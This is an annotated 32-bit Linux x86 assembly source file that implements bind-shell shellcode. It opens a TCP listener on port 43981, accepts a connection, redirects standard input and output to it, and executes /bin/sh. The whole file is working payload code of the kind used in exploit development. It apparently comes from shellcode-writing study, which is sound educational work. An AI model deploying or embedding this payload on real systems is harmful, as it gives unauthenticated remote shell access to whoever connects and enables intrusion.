; Title:  shell_bind_tcp.nasm
; Author: Ryan Fenno
; Date:   5 September 2013
global _start
section .text
_start:
    xor ebx, ebx
    mul ebx           ; eax, ebx, edx all cleared
    push byte 0x66    ; socketcall(2)
    pop eax
    inc ebx           ; socket(2) [1]
    push edx          ; arg3 :: protocol    = 0
    push ebx          ; arg2 :: SOCK_STREAM = 1 <sys/socket.h>
    push byte 0x2     ; arg1 :: AF_INET     = 2 <sys/socket.h> 
    mov ecx, esp
    int 0x80
    xchg esi, eax     ; srv_sockfd moved from eax to esi

    push byte 0x66    ; socketcall(2)
    pop eax
    inc ebx           ; bind(2) [2]
                      ; build sockaddr_in struct
    push edx          ; INADDR_ANY = 0     <netinet/in.h>
    push word 0xCDAB  ; PORT       = 43981
    push word bx      ; AF_INET    = 2     <sys/socket.h>
    mov ecx, esp      ; pointer to sockaddr_in struct
    push byte 0x10    ; arg3 :: size of struct = word + word + dword = 16
    push ecx          ; arg2 :: pointer to sockaddr_in struct
    push esi          ; arg1 :: srv_sockfd
    mov ecx, esp
    int 0x80

    ; [eax is necessarily zero here; verified via GDB]
    mov al, 0x66      ; socketcall(2)
    mov bl, 0x4       ; listen(2) [4]
    push edx          ; arg2 :: protocol = 0
    push esi          ; arg1 :: srv_sockfd
    mov ecx, esp
    int 0x80

    ; [eax is necessarily zero here; verified via GDB]
    mov al, 0x66      ; socketcall(2)
    inc ebx           ; accept(2) [5]
    push edx          ; arg3 :: addrlen = NULL
    push edx          ; arg2 :: addr    = NULL
    push esi          ; arg1 :: srv_sockfd
    mov ecx, esp
    int 0x80
    xchg eax, ebx     ; arg1 in ebx; 0x5 (32-bits) in eax
    push 0x2
    pop ecx           ; loop from 2 to 0
dup2loop:
    mov byte al, 0x3F ; dup2(2)
    int 0x80
    dec ecx
    jns dup2loop      ; loop ends when ecx == -1

    xor eax, eax
    mov byte al, 0xB  ; execve(2)
    push edx          ; null terminator
    push 0x68732f2f   ; "hs//"
    push 0x6e69622f   ; "nib/"
    mov ebx, esp      ; arg1 :: "/bin/sh\0"
    push edx          ; null terminator
    mov edx, esp      ; arg3 :: envp = NULL array
    push ebx
    mov ecx, esp      ; arg2 :: argv array (ptr to string)
    int 0x80


